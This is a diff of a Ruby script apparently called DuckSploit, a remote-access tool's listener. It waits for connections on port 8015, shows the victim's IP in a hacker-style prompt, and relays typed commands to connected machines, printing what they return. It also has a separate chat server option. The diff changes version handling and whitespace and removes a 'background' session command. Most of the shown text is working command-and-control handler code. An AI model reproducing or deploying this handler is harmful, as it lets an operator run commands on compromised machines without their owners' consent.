@@ -7,7 +7,7 @@ port = 8015
 chathost = "0.0.0.0"
 chatport = 8012
 
-version = "1.0.7"
+version = File.read("C:/DuckSploit/version.txt")
 
 
 loop do
@@ -30,7 +30,7 @@ loop do
 	puts " "
 	print "Choose option [1,2,3,4]: ".green.bold.blink
 	menu = gets.chomp
-	
+
 	if menu == "1"
 		server = TCPServer.new(host, port)
 		puts "Listening on #{host}:#{port.to_s}"
@@ -47,36 +47,34 @@ loop do
 						# whoami = client.gets.gsub("\\NEWLINE", "\n").chomp.chomp
 						# client.puts currentDirCommand
 						# cd = client.gets.gsub("\\NEWLINE", "\n").chomp.chomp
-				
+
 						puts " "
 						puts "┌──".red.bold + "(".red.bold  + "#{remote_ip}".green.bold + ")".red.bold + "-".red.bold + "[".red.bold + "~/Desktop".yellow.bold + "]".red.bold
 						print "└─".red.bold + "$ ".green.bold
-			
 
-				
-				
+
+
+
 						cmd = gets.chomp
 						client.puts cmd
-				
-				
+
+
 						if cmd.downcase == "exit"
 							puts "[".red.bold.blink + "~".white.bold.blink + "] Exiting...".red.bold.blink
 							sleep(3)
 							exit
-					
+
 						elsif cmd.downcase == "clear"
 							system("cls")
 							system("clear")
-				
+
 						elsif cmd.downcase == "reload"
 							puts "[".red.bold.blink + "~".white.bold.blink + "] Reloading...".red.bold.blink
 							sleep(3)
 							break
-						elsif cmd.downcase == "background"
-							system("setx 'ds_backup_ip[#{sessionnum}]' #{remote_ip}")
 						end
 						out = client.gets.chomp.gsub("\\NEWLINE", "\n")
-				
+
 						print out
 					end
 				else
@@ -90,6 +88,7 @@ loop do
 		end
 	elsif menu == "2"
 		system("cls")
+		puts "Waiting for connections to chat...".green.bold.blink
 		class Server
 		def initialize( port, ip )
 		    @server = TCPServer.open( ip, port )
@@ -101,7 +100,7 @@ loop do
 		    @connections[:clients] = @clients
 		    run
 		  end
- 
+
 		  def run
 		    loop {
 		      Thread.start(@server.accept) do | client |
@@ -119,7 +118,7 @@ loop do
 		      end
 		    }.join
 		  end
- 
+
 		  def listen_user_messages( username, client )
 		    loop {
 		      msg = client.gets.chomp
@@ -131,9 +130,9 @@ loop do
 		    }
 		  end
 		end
- 
+
 		Server.new( chatport, chathost )
-		
+
 
 
 	elsif menu == "3"
